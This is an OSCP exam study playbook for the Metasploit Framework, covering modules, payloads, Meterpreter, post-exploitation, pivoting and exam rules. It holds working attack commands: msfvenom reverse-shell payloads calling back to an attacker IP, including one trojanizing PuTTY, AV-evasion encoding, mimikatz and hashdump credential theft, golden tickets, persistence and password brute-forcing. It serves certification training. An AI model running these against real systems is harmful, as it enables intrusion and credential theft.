# Metasploit

Comprehensive playbook for Metasploit Framework usage during the OSCP exam.

---

## Table of Contents
1. [OSCP Exam Rules — Read First](#oscp-rules)
2. [Setup & Database](#setup)
3. [msfconsole Basics](#basics)
4. [Search Syntax](#search)
5. [Module Types & The 5-Step Loop](#modules)
6. [Setting Options](#options)
7. [Payloads — Staged vs Stageless & Meterpreter](#payloads)
8. [Sessions](#sessions)
9. [multi/handler in Depth](#multihandler)
10. [Meterpreter Commands](#meterpreter)
11. [Post-Exploitation Modules](#post)
12. [Auxiliary Scanners (always allowed)](#auxiliary)
13. [msfvenom Recap](#msfvenom)
14. [Pivoting & Routing](#pivoting)
15. [Resource Scripts & Automation](#resource)
16. [Gotchas & Troubleshooting](#gotchas)
17. [Quick-Reference Cheat Card](#cheatcard)

---

<a id="oscp-rules"></a>
## 1. OSCP Exam Rules — Read First

**The single most important fact:** OSCP restricts Metasploit usage. Confirm current rules from the official exam guide before exam day, but the long-standing policy is:

| Allowed without limit | Restricted (one target only) |
|---|---|
| `msfvenom` — generate payloads | `exploit/*` modules |
| `auxiliary/*` modules (scanners, fuzzers, login brute) | `post/*` modules counted toward the "MSF box" |
| `multi/handler` (catching shells) | Meterpreter shells |
| Manual exploits / scripts / Burp / etc. | Any module that runs an exploit |

**Strategy implications:**
- **Pick your MSF box wisely.** Use it on the box where the manual path is painful (e.g., complex SMB exploit chains) and keep manual exploits for the others.
- Auxiliary scanners (`scanner/smb/smb_version`, `scanner/snmp/snmp_login`, etc.) are *always allowed* — use them freely for enum.
- `multi/handler` is just a listener, not an exploit — using it to catch your own shell does not count.
- When in doubt, document your usage clearly in the report and don't try to be clever.

**Rule of thumb:** If a module would have an `EXITSTATUS` or RHOSTS+payload combination, it's an exploit. If it's just gathering data, it's auxiliary.

---

<a id="setup"></a>
## 2. Setup & Database

### Start the database (must do once per Kali session)
```bash
sudo systemctl start postgresql
sudo msfdb init                    # first time only
sudo msfdb start                   # subsequent
msfconsole -q                      # -q = no banner
```

Verify inside msfconsole:
```
db_status
# Should say: "Connected to msf. Connection type: postgresql."
```

If broken:
```bash
sudo msfdb reinit                  # nuke and recreate
```

### Workspaces (one per box/engagement)
```
workspace                          # list
workspace -a oscp_lab1             # add
workspace oscp_lab1                # switch
workspace -d old_workspace         # delete
workspace -r new_name              # rename
```

### Import nmap into the DB
```
db_nmap -sV -p- 10.10.10.5         # runs nmap and imports
db_import scan.xml                 # import existing nmap -oX
hosts                              # list discovered hosts
services                           # list discovered services
services -p 445 -R                 # auto-fill RHOSTS for module
vulns                              # list vulns found
creds                              # captured credentials
loot                               # captured loot (files, hashes)
```

**Tip:** `-R` after a `services`, `hosts`, or `vulns` query auto-populates `RHOSTS` for the next module — huge time saver.

---

<a id="basics"></a>
## 3. msfconsole Basics

### Launching with options
```bash
msfconsole -q                       # quiet (no banner)
msfconsole -r script.rc             # run resource script then drop to console
msfconsole -x "use exploit/...; set RHOSTS x; run"  # one-shot
msfconsole --no-database            # skip DB (faster, but no `hosts`/`services`)
```

### Universal commands
| Command | Purpose |
|---|---|
| `help` | Top-level help |
| `?` | Same as `help` |
| `back` | Exit current module context |
| `previous` | Switch back to the last-used module |
| `use <module>` | Load a module |
| `info` | Show details on current/given module |
| `show options` | Required & optional settings |
| `show advanced` | Hidden advanced settings |
| `show targets` | OS/arch targets for exploit |
| `show payloads` | Compatible payloads |
| `show evasion` | Evasion options |
| `set <OPT> <val>` | Set an option |
| `setg <OPT> <val>` | Set globally (across modules) |
| `unset <OPT>` | Clear |
| `unset all` | Clear all options on current module |
| `save` | Persist `setg` values to config |
| `run` / `exploit` | Execute |
| `run -j` / `exploit -j` | Run as a background job |
| `run -z` | Execute, don't auto-interact with session |
| `jobs` | List background jobs |
| `jobs -k <id>` | Kill job |
| `sessions` | List sessions |
| `sessions -i <id>` | Interact with session |
| `bg` | Background current Meterpreter session (Ctrl+Z also works) |

### Shell escape
```
msf > shell ls -la                 # run any host command
msf > ! ls                         # same
```

### Tab completion
Hit `<Tab>` constantly — module paths, option names, payload names. Saves massive time.

---

<a id="search"></a>
## 4. Search Syntax

```
search eternalblue
search ms17-010
search type:exploit platform:windows ms17

# Combined keywords
search type:exploit platform:linux name:samba
search cve:2017-0144
search rank:excellent platform:windows smb
search author:zerosum0x0
```

| Keyword | Examples |
|---|---|
| `type:` | exploit, auxiliary, post, payload, encoder, nop, evasion |
| `platform:` | windows, linux, unix, osx, android, php, multi |
| `name:` | substring match in module name |
| `cve:` | `cve:2014-6271` |
| `bid:` | Bugtraq ID |
| `edb:` | Exploit-DB ID |
| `rank:` | excellent, great, good, normal, average, low, manual |
| `app:` | client, server |
| `author:` | researcher name |

**Use `info` after search:**
```
info exploit/windows/smb/ms17_010_eternalblue
info 3                              # use the index from last search
use 3                               # use from index
```

---

<a id="modules"></a>
## 5. Module Types & The 5-Step Loop

| Type | Purpose | OSCP allowed? |
|---|---|---|
| `exploit/` | Triggers a vuln, drops a payload | Counted toward 1 |
| `auxiliary/` | Scanners, fuzzers, brute, sniff, DoS | Yes, unlimited |
| `post/` | Run after session (enum, persistence, pivot) | Counts if used with exploit session |
| `payload/` | The shellcode delivered by an exploit | n/a alone |
| `encoder/` | Encode payload to dodge AV / bad chars | n/a alone |
| `nop/` | NOP sled generators | n/a alone |
| `evasion/` | AV evasion-focused generators | Counts as exploit |

### The 5-step loop you'll repeat for every module

```
1. search <term>
2. use <module>
3. show options          # what's required (in red)
4. set <OPT> <val>       # fill required fields
5. run                   # or `exploit` or `check`
```

`check` (when implemented) probes whether the target is vulnerable without firing the exploit. Always run `check` first on exploit modules — saves wasted attempts.

---

<a id="options"></a>
## 6. Setting Options

### Common options
| Option | Meaning |
|---|---|
| `RHOSTS` | Target IP(s). Accepts CIDR, ranges, files (`file:/tmp/ips.txt`) |
| `RPORT` | Target port |
| `LHOST` | Your IP (the listener will bind here) |
| `LPORT` | Your port |
| `PAYLOAD` | Override default payload |
| `TARGET` | Target index from `show targets` |
| `SSL` | true/false |
| `VHOST` | Virtual host header |
| `TARGETURI` | App path (e.g., `/wordpress/`) |
| `THREADS` | Parallel threads (scanners) |
| `VERBOSE` | true = more output |

### Global vs per-module
```
setg LHOST 10.10.14.5              # global, every module gets it
setg RHOSTS 10.10.10.5             # global
save                                # persist to ~/.msf4/config

set RHOSTS 10.10.10.6               # per-module (overrides global)
```

**Gotcha:** A leftover `setg RHOSTS` from yesterday's box is a classic foot-gun. `unsetg RHOSTS` or just `setg RHOSTS <new>` when switching.

### LHOST shortcuts
```
setg LHOST tun0                    # uses tun0 IP — auto-resolves
setg LHOST eth0                    # same for ethernet
```
**Gotcha:** `LHOST tun0` only works in MSF; in `msfvenom` you must give the actual IP.

### RHOSTS power syntax
```
set RHOSTS 10.10.10.5
set RHOSTS 10.10.10.0/24
set RHOSTS 10.10.10.5-50
set RHOSTS file:/tmp/targets.txt
set RHOSTS 10.10.10.5 10.10.10.7 10.10.10.9       # space-separated
```

---

<a id="payloads"></a>
## 7. Payloads — Staged vs Stageless & Meterpreter

### Staged vs stageless — the slash tells you which
| Format | Type | Use when |
|---|---|---|
| `windows/x64/meterpreter/reverse_tcp` | **Staged** (small stub fetches stage2) | Tight buffer overflow space |
| `windows/x64/meterpreter_reverse_tcp` | **Stageless** (single blob, no underscore-then-slash split) | More reliable, larger size |
| `windows/x64/shell/reverse_tcp` | **Staged** plain CMD shell | When meterpreter banned/blocked |
| `windows/x64/shell_reverse_tcp` | **Stageless** plain CMD shell | Same |

**The slash rule:** `<os>/<arch>/<payload>/<transport>` = staged. `<os>/<arch>/<payload>_<transport>` = stageless.

### When to use what
- **Meterpreter** = post-ex toolkit (file ops, port forwards, hashdump, mimikatz integration). Use when allowed.
- **Shell (`shell_reverse_tcp`)** = raw cmd/bash over a socket. No frills but works everywhere and easier to justify in reports.
- **Stageless** when target has no egress restrictions and you want reliability.
- **Staged** when shellcode space is tiny (BOF exploits).

### Picking the right payload
```
show payloads                       # filtered by current exploit's target
set PAYLOAD windows/x64/shell_reverse_tcp
set PAYLOAD windows/x64/meterpreter/reverse_https      # encrypted, less likely IDS hit
set PAYLOAD generic/shell_reverse_tcp                  # works on many platforms
```

### Common payloads
**Windows**
```
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_https           # TLS, blends with HTTPS
windows/x64/meterpreter_reverse_tcp             # stageless
windows/x64/shell/reverse_tcp
windows/x64/shell_reverse_tcp
windows/meterpreter/reverse_tcp                 # x86 (older targets)
```

**Linux**
```
linux/x64/meterpreter/reverse_tcp
linux/x64/meterpreter_reverse_tcp
linux/x64/shell_reverse_tcp
linux/x86/shell_reverse_tcp
cmd/unix/reverse_bash
cmd/unix/reverse_python
cmd/unix/reverse_perl
```

**Catch-all**
```
generic/shell_reverse_tcp                       # MSF auto-detects arch on connect
```

---

<a id="sessions"></a>
## 8. Sessions

### Listing & interacting
```
sessions                            # list all
sessions -l                         # detailed list
sessions -i 1                       # interact with session 1
sessions -i -1                      # most recent session
sessions -k 1                       # kill session 1
sessions -K                         # kill ALL sessions
sessions -u 1                       # upgrade shell -> meterpreter (see below)
sessions -c "whoami" -i 1           # run command in session
sessions -s checkvm                 # run a post script across sessions
```

### Background a meterpreter
```
meterpreter > background            # back to msf prompt
meterpreter > bg                    # alias
(Ctrl+Z then y also works)
```

### Upgrade plain shell → meterpreter
Two options:
```
# Option A (fast)
sessions -u 1

# Option B (manual, more control)
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST tun0
set LPORT 4445                      # NEW port — must differ from old listener
run
```
**Gotcha:** Shell-to-meterpreter creates a second connection on a NEW port. Make sure that port is reachable outbound from the target. If LHOST/LPORT collide with an existing listener it silently fails.

**Gotcha (OSCP):** Upgrading a manually-caught shell to meterpreter on a non-MSF-allowed box may violate exam rules. If you're not on your "MSF box", don't upgrade.

---

<a id="multihandler"></a>
## 9. multi/handler in Depth

`multi/handler` is just a listener. It does NOT count as an exploit — use it freely to catch shells from manual payloads, msfvenom outputs, etc.

### Basic
```
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST tun0
set LPORT 4444
set ExitOnSession false             # keep listening after first catch
run -j                              # background as job
```

### One-liner from shell
```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/shell_reverse_tcp; \
  set LHOST tun0; set LPORT 4444; \
  set ExitOnSession false; run -j"
```

### Critical rule: PAYLOAD must match what was generated
If `msfvenom` was called with `-p windows/x64/shell_reverse_tcp`, the handler **must** use the same string. Staged vs stageless mismatch = silent failure or `[*] Sending stage` followed by disconnect.

### Useful handler options
```
set ExitOnSession false             # keep job alive after session
set EnableStageEncoding true        # encode stage 2 (AV evasion)
set StagerVerifySSLCert false       # for HTTPS payloads with self-sign
set OverrideRequestHost true        # if using reverse_https + Host headers
set AutoRunScript multi_console_command -rc /tmp/post.rc   # auto-run on connect
```

---

<a id="meterpreter"></a>
## 10. Meterpreter Commands

### Core
```
sysinfo                             # OS, arch, computer name
getuid                              # current user
getpid                              # current PID
ps                                  # process list
ps -S notepad                       # search
kill <pid>
migrate <pid>                       # move into another process (e.g., explorer.exe)
migrate -N explorer.exe             # by name
```

### Privilege
```
getprivs                            # list current privileges
getsystem                           # try several local privesc techniques
load kiwi                           # load Mimikatz extension
creds_all                           # dump everything (kiwi)
hashdump                            # SAM hashes (requires SYSTEM)
```

### Files
```
pwd
cd C:\\Users\\bob
ls
download C:\\Users\\bob\\flag.txt   # to your CWD on Kali
download -r C:\\Users\\bob\\Desktop
upload /tmp/winPEAS.exe C:\\Windows\\Temp\\
edit file.txt                       # opens in your local editor
cat file.txt
search -f *.kdbx -d C:\\            # find files
```

### Networking
```
ipconfig
netstat
arp
route
portfwd add -l 8080 -p 80 -r 10.10.10.50     # local 8080 -> target's 10.10.10.50:80
portfwd list
portfwd delete -l 8080
```

### Execution
```
execute -f cmd.exe -i -H            # interactive, hidden
execute -f notepad.exe              # fire-and-forget
shell                                # drop to native cmd/bash
```

### Persistence (CAREFUL — disruptive, usually report-worthy only)
```
run persistence -X -i 30 -p 4444 -r 10.10.14.5
# -X start at boot, -i interval seconds, -p port, -r our IP
# DO NOT USE on production / shared lab without authorization.
```

### Windows specifics
```
load kiwi
kiwi_cmd "sekurlsa::logonpasswords"
golden_ticket_create -u admin -d corp.local -k <krbtgt_hash> -s <sid> -t /tmp/gt.kirbi

load incognito
list_tokens -u
impersonate_token "CORP\\Administrator"

run post/windows/gather/win_privs
run post/windows/gather/credentials/credential_collector
```

### Linux specifics
```
load python
python_import -f /opt/script.py
python_execute "print('hi')"

run post/linux/gather/enum_configs
run post/linux/gather/checkvm
```

### Quitting cleanly
```
exit                                # exit the session
exit -y                             # don't prompt
exit -z                             # exit AND kill session
```

---

<a id="post"></a>
## 11. Post-Exploitation Modules

After landing a session, set `SESSION <id>` and run.

### Universal
```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```
Returns a list of likely-vulnerable local privesc modules.

### Windows enum
```
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_applications
post/windows/gather/enum_shares
post/windows/gather/enum_av_excluded
post/windows/gather/checkvm
post/windows/gather/credentials/credential_collector
post/windows/gather/credentials/windows_autologin
post/windows/gather/credentials/mremote
post/windows/gather/hashdump                       # SAM, needs SYSTEM
post/windows/gather/smart_hashdump                 # DC hashes if on DC
post/windows/manage/migrate
```

### Linux enum
```
post/linux/gather/enum_configs
post/linux/gather/enum_network
post/linux/gather/enum_protections
post/linux/gather/enum_system
post/linux/gather/enum_users_history
post/linux/gather/checkvm
post/linux/gather/hashdump                         # /etc/shadow
post/multi/recon/local_exploit_suggester
```

### Pivoting helpers
```
post/multi/manage/autoroute                        # auto-add routes via session
post/windows/manage/portproxy
```

---

<a id="auxiliary"></a>
## 12. Auxiliary Scanners (always allowed)

Free real-estate — use freely on every box.

### SMB
```
use auxiliary/scanner/smb/smb_version              # OS, signing required?
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_login                # cred brute
use auxiliary/scanner/smb/smb_ms17_010             # EternalBlue vuln check (NOT exploit)
use auxiliary/scanner/smb/pipe_auditor
```

### HTTP
```
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/title
use auxiliary/scanner/http/wordpress_login_enum
use auxiliary/scanner/http/joomla_version
```

### SSH / FTP / Telnet
```
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_login_pubkey
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/telnet/telnet_login
```

### SNMP / DNS / LDAP
```
use auxiliary/scanner/snmp/snmp_login              # community string brute
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/dns/dns_amp
use auxiliary/gather/enum_dns
use auxiliary/scanner/discovery/udp_sweep
```

### Database
```
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/admin/mssql/mssql_enum
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/postgres/postgres_login
```

### Win RM / RDP
```
use auxiliary/scanner/winrm/winrm_auth_methods
use auxiliary/scanner/winrm/winrm_login
use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep   # vuln check
```

### Brute templates
Most `_login` modules share these options:
```
set RHOSTS 10.10.10.5
set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERPASS_FILE creds.txt          # combined user:pass per line
set STOP_ON_SUCCESS true
set BLANK_PASSWORDS true
set USER_AS_PASS true
set VERBOSE false
set THREADS 5                        # don't hammer
run
```

---

<a id="msfvenom"></a>
## 13. msfvenom Recap

(Detailed examples in `Reverse-Shells.md` section 6.)

Template:
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUT>
```

### List things
```bash
msfvenom -l payloads                 # list all payloads
msfvenom -l formats                  # exe, elf, raw, c, py, war, hta-psh, msi...
msfvenom -l encoders
msfvenom --list-options -p windows/x64/shell_reverse_tcp
```

### Common combos
```bash
# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o s.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o s.elf

# Buffer overflow shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
  EXITFUNC=thread -b "\x00\x0a\x0d" -f python -v shellcode

# Encoder + iterations (AV evasion — diminishing returns)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
  -e x86/shikata_ga_nai -i 5 -f exe -o s.exe

# Embed in a legit template
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
  -x putty.exe -k -f exe -o evil_putty.exe

# WAR for Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o shell.war
```

**Modern Defender shreds standard msfvenom EXEs.** Encoders alone won't beat it. Consider:
- Stageless `windows/x64/shell_reverse_tcp` is sometimes less recognized than meterpreter.
- Custom shellcode loaders (out of scope for OSCP).
- For OSCP labs, default Defender is usually OFF — don't over-engineer.

---

<a id="pivoting"></a>
## 14. Pivoting & Routing

When a session lands on a dual-homed host that can reach an internal subnet you can't.

### Add a route through a session
```
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.50.0
set NETMASK 255.255.255.0
run

# OR from inside meterpreter:
meterpreter > run autoroute -s 192.168.50.0/24
meterpreter > run autoroute -p           # print current routes
```

Now `RHOSTS 192.168.50.10` in any MSF module routes through session 1 automatically.

### SOCKS proxy for non-MSF tools (nmap, curl, browser)
```
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run -j
```
Then in `/etc/proxychains4.conf` add `socks5 127.0.0.1 1080` and prefix non-MSF tools:
```bash
proxychains4 nmap -sT -Pn -p 80,445 192.168.50.10
proxychains4 curl http://192.168.50.10
```

**Gotcha:** SOCKS routing through MSF is TCP-only and **SYN scan (`-sS`) doesn't work** — use `-sT` (TCP connect). Add `-Pn -n` to skip host discovery and DNS.

### Port forwarding (Meterpreter local fwd)
```
meterpreter > portfwd add -l 8080 -p 8080 -r 192.168.50.10
# Now hit http://127.0.0.1:8080 on Kali to reach internal:8080
```

(See `Tunneling.md` for ssh / chisel / ligolo-ng alternatives that avoid MSF entirely.)

---

<a id="resource"></a>
## 15. Resource Scripts & Automation

A `.rc` file is a sequence of msfconsole commands run on startup.

```
# handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST tun0
set LPORT 4444
set ExitOnSession false
run -j
```
Run it:
```bash
msfconsole -q -r handler.rc
# Or inside msfconsole:
msf > resource handler.rc
```

### Inline Ruby
A `.rc` file can also contain Ruby code:
```
<ruby>
hosts = framework.db.hosts
hosts.each { |h| print_status("Host: #{h.address}") }
</ruby>
```

### Useful patterns
```bash
# Auto-start handler on Kali boot
echo 'msfconsole -q -r ~/handler.rc' >> ~/.bashrc
```

---

<a id="gotchas"></a>
## 16. Gotchas & Troubleshooting

### Handler / payload
- **"Sending stage" then disconnect** — staged/stageless mismatch, or AV killed stage2.
- **Payload arch mismatch** — `windows/x64/...` payload on 32-bit target = silent fail. Confirm arch with `systeminfo` or `wmic os get osarchitecture`.
- **LHOST defaulted to 127.0.0.1** — you forgot `set LHOST tun0`. Target dials home to itself. Always check `show options` before `run`.
- **Defender ate the EXE** — try `windows/x64/shell_reverse_tcp` stageless, or PowerShell payload via `IEX`.
- **Listener on `eth0` but VPN is `tun0`** — `ip a` and double-check.

### Database
- `db_status` says "no database" — `sudo msfdb start` then restart msfconsole.
- `db_nmap` hangs — same as running `nmap`, can be slow over VPN. Use `-T4 --min-rate 1000` cautiously (faster but louder).
- Hosts from a previous engagement showing up — wrong `workspace`. `workspace -a oscp_today; workspace oscp_today`.

### Sessions
- `[-] Session X is not valid` — session died. `sessions -l` to confirm. Meterpreter dies if you `migrate` into a dying process — migrate to `explorer.exe` early.
- Ctrl+C inside meterpreter — usually just cancels the current command, but in unstable sessions can kill it. Use `background` cleanly.
- Lots of stale "dead" sessions — `sessions -K` to clear, then re-listen.

### General
- **`use exploit/...` and the prompt color changes** — red prompt = exploit module loaded (counts toward OSCP MSF limit if you `run` it).
- **`exploit -j -z` is your friend** — backgrounds the handler AND doesn't auto-interact, so listing sessions is up to you.
- **Resource scripts not loading** — wrong path. `pwd` in msfconsole, use absolute paths.
- **MSF won't update** — `sudo apt update && sudo apt install metasploit-framework`. Don't `msfupdate` (deprecated).

### OSCP-specific
- **Track which box you ran MSF on.** Write it in your notes the moment you do. Easy to lose track at 4am.
- **`auxiliary/scanner/smb/smb_ms17_010` is a VULN CHECK, not the exploit.** Safe to use everywhere.
- **`exploit/windows/smb/ms17_010_eternalblue` is the actual exploit.** Counts toward your one allowed box.
- **`multi/handler` doesn't count.** Even if you start it from msfconsole, it's a listener.
- **`msfvenom` doesn't count.** It's just a payload generator.
- **`post/multi/recon/local_exploit_suggester` is a post module** — counts if you ran an exploit to get the session. If you got the session manually, post modules on that session probably are fine; check current exam rules.

---

<a id="cheatcard"></a>
## 17. Quick-Reference Cheat Card

```text
STARTUP
  sudo systemctl start postgresql && sudo msfdb start
  msfconsole -q
  workspace -a oscp_box1; workspace oscp_box1
  db_nmap -sV -p- TARGET

THE LOOP
  search <term>
  use <module>
  show options
  set RHOSTS x; set LHOST tun0; set LPORT 443
  check                  # if exploit
  run -j                 # background

HANDLER (always OK)
  use exploit/multi/handler
  set PAYLOAD windows/x64/shell_reverse_tcp
  set LHOST tun0; set LPORT 4444
  set ExitOnSession false
  run -j

SESSIONS
  sessions -l
  sessions -i 1
  sessions -u 1          # shell -> meterpreter (uses new port!)
  sessions -K            # kill all

METERPRETER ESSENTIALS
  sysinfo; getuid; getsystem
  ps; migrate <pid>
  download/upload <path>
  shell
  portfwd add -l 8080 -p 80 -r 10.10.10.50
  load kiwi; creds_all
  hashdump
  background

PIVOTING
  run autoroute -s 192.168.50.0/24
  use auxiliary/server/socks_proxy; set VERSION 5; run -j
  proxychains4 nmap -sT -Pn ...

MSFVENOM (always OK)
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0_ip LPORT=443 -f exe -o s.exe
  msfvenom -p linux/x64/shell_reverse_tcp   LHOST=tun0_ip LPORT=443 -f elf -o s.elf

OSCP RULE OF THUMB
  exploit/ + payload + run  = COUNTS (one allowed)
  auxiliary/, msfvenom, multi/handler = FREE
```

**The 3 lines you'll type 100 times:**
```
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST tun0; set LPORT 443; set ExitOnSession false; run -j
```
